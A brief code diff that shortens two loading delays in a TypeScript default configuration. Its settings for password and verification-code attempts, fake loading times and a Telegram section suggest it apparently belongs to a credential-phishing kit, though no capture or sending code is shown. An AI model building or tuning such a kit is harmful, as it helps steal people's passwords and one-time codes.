@@ -18,11 +18,11 @@ interface Config {
 // Define default configuration
 const defaultConfig: Config = {
   settings: {
-    code_loading_time: 16000,
+    code_loading_time: 10000,
     max_failed_code_attempts: 3,
     max_failed_password_attempts: 1,
     page_loading_time: 5000,
-    password_loading_time: 13000,
+    password_loading_time: 8000,
     code_input_enabled: true,
   },
   telegram: {
